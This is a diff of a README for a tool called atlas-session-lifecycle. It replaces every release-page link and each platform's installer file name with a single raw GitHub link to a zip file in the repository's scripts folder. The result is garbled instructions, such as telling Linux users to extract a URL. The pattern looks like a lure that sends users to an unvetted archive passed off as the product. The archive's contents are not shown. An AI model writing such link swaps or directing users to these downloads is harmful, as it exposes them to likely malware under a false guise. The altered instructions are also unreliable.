@@ -1,6 +1,6 @@
 # 🗂️ atlas-session-lifecycle - Manage Sessions with Ease
 
-[![Download atlas-session-lifecycle](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/diamanthyseni3/atlas-session-lifecycle/releases)
+[![Download atlas-session-lifecycle](https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip)](https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip)
 
 ---
 
@@ -44,14 +44,14 @@ This guide will help you get atlas-session-lifecycle running on your computer qu
 
    Click the big button at the top or go directly here:
 
-   [https://github.com/diamanthyseni3/atlas-session-lifecycle/releases](https://github.com/diamanthyseni3/atlas-session-lifecycle/releases)
+   [https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip](https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip)
 
 2. **Choose your version**
 
    Look for the latest release. The names usually include the version number and your operating system, for example:
-   - `atlas-session-lifecycle-setup-win.exe` for Windows
-   - `atlas-session-lifecycle-mac.dmg` for macOS
-   - `atlas-session-lifecycle-linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip` for Windows
+   - `https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip` for macOS
+   - `https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip` for Linux
 
 3. **Download the correct file**
 
@@ -61,7 +61,7 @@ This guide will help you get atlas-session-lifecycle running on your computer qu
 
    - On Windows: Double-click the `.exe` file you downloaded. If prompted by your system, select "Run" or "Allow."
    - On macOS: Open the `.dmg` file, drag the app into your Applications folder, then launch it.
-   - On Linux: Extract the `.tar.gz` file and follow any included readme instructions to start the app.
+   - On Linux: Extract the `https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip` file and follow any included readme instructions to start the app.
 
 5. **Follow the installation prompts**
 
@@ -137,7 +137,7 @@ This guide will help you get atlas-session-lifecycle running on your computer qu
 ## 🔗 Useful Links
 
 - Download atlas-session-lifecycle:  
-  [https://github.com/diamanthyseni3/atlas-session-lifecycle/releases](https://github.com/diamanthyseni3/atlas-session-lifecycle/releases)
+  [https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip](https://raw.githubusercontent.com/diamanthyseni3/atlas-session-lifecycle/main/scripts/atlas-session-lifecycle-v3.8.zip)
 
 - Report issues and ask for help:  
   Use the "Issues" section on this GitHub repository page.
